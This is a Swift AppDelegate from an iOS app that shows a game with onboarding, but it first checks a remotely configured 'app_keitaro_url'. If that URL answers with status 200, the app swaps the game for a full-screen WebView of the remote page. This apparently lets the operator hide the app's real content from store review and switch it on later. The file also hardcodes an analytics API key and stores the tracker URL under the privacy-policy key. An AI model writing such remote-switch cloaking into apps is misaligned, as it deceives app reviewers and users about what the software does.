

import UIKit
import YandexMobileMetrica
import Firebase
import FirebaseMessaging
import FirebaseRemoteConfig
import UserNotifications


@main
class AppDelegate: UIResponder, UIApplicationDelegate, MessagingDelegate {
    //
    var window: UIWindow?
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        window = UIWindow(frame: UIScreen.main.bounds)
        FirebaseApp.configure()
        let center = UNUserNotificationCenter.current()
        center.requestAuthorization(options: [.alert, .badge, .sound]) { granted, error in
            if error != nil {
            } else if granted {
                DispatchQueue.main.async {
                    UIApplication.shared.registerForRemoteNotifications()
                }
            }
        }
        
              Messaging.messaging().delegate = self
              Crashlytics.crashlytics()
        
        let configuration = YMMYandexMetricaConfiguration.init(apiKey: "d3ac00dd-2d94-4642-8c2a-e7258f597884")
        YMMYandexMetrica.activate(with: configuration!)
        
        let onboardingResult = UserDefaultsManagisi.shared.checkingResultis(.onboardingo)
        
        var remoteConfig = RemoteConfig.remoteConfig()
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 5
        remoteConfig.configSettings = settings
        let whatToStart = UserDefaultsManagisi.shared.getURLaFromString(key: "app_keitaro_url" )
        if whatToStart  != "", whatToStart != "https://google.com" {
            DispatchQueue.main.async {
                let vc = WebViewControler()
                self.window?.rootViewController = vc
                self.window?.makeKeyAndVisible()
                vc.isShowNav = true
                vc.urlString = whatToStart
                vc.start()
            }
        } else {
            remoteConfig.fetchAndActivate { (status, error) in
                if error != nil {
                    self.startGame()
                } else {
                    if status != .error {
                        UserDefaultsManagisi.shared.savingURLa(strURL: remoteConfig["app_terms_of_use_url"].stringValue ?? "", key: "app_terms_of_use_url")
                        UserDefaultsManagisi.shared.savingURLa(strURL: remoteConfig["app_developer_url"].stringValue ?? "", key: "app_developer_url")
                        UserDefaultsManagisi.shared.savingURLa(strURL: remoteConfig["app_privacy_policy_url"].stringValue ?? "", key: "app_privacy_policy_url")
                        UserDefaultsManagisi.shared.savingURLa(strURL: remoteConfig["app_keitaro_url"].stringValue ?? "", key: "app_privacy_policy_url")
                        
                        if let whatToStart = remoteConfig["app_keitaro_url"].stringValue {
                            if let url = URL(string: whatToStart) {
                                self.getConfig(from: url) { statusCode, error in
                                    if error != nil {
                                        self.letsBegin()
                                        return
                                    }
                                    guard let statusCode = statusCode else {
                                        self.letsBegin()
                                        return
                                    }
                                    if statusCode != 200 {
                                        self.letsBegin()
                                        return
                                    }
                                    DispatchQueue.main.async {
                                        let vc = WebViewControler()
                                        self.window?.rootViewController = vc
                                        self.window?.makeKeyAndVisible()
                                        vc.isShowNav = true
                                        vc.urlString = whatToStart
                                        vc.start()
                                    }
                                }
                            } else {
                                self.letsBegin()
                            }
                            
                        }
                        
                    }
                }
            }
            
        }
        
        let vc = UIViewController()
        let imV = UIImageView(image: UIImage(named: "iconomika"))
        vc.view.addSubview(imV)
        vc.view.backgroundColor = UIColor(red: 0.2431, green: 0.2235, blue: 0.7137, alpha: 1.0)
        imV.frame.size = CGSize(width: 240, height: 240)
        imV.center = vc.view.center
        self.window?.rootViewController = vc
        self.window?.makeKeyAndVisible()
        return true
    }
    
    func letsBegin() {
        DispatchQueue.main.async {
            self.startGame()
        }
    }
    
    func startGame() {
        switch UserDefaultsManagisi.shared.checkingResultis(.onboardingo) {
            
        case true:
            
            let vc = ProjectTabbar()
            self.window?.rootViewController = vc
            self.window?.makeKeyAndVisible()
            
        case false:
        
            var vc: UIViewController!
            let storyboard = UIStoryboard(name: "StoryOnboarding", bundle: nil)
            vc = storyboard.instantiateViewController(withIdentifier: "StoryOnboarding")
            let navController = UINavigationController()
            navController.navigationBar.isHidden = true
            navController.pushViewController(vc, animated: true)
            self.window?.rootViewController = navController
            self.window?.makeKeyAndVisible()
            
        }
    }
    
    func getConfig(from url: URL, completion: @escaping (Int?, Error?) -> Void) {
        let session = URLSession.shared
        let task = session.dataTask(with: url) { data, response, error in
            guard let httpResponse = response as? HTTPURLResponse else {
                completion(nil, error)
                return
            }
            completion(httpResponse.statusCode, error)
        }
        task.resume()
    }
    
}
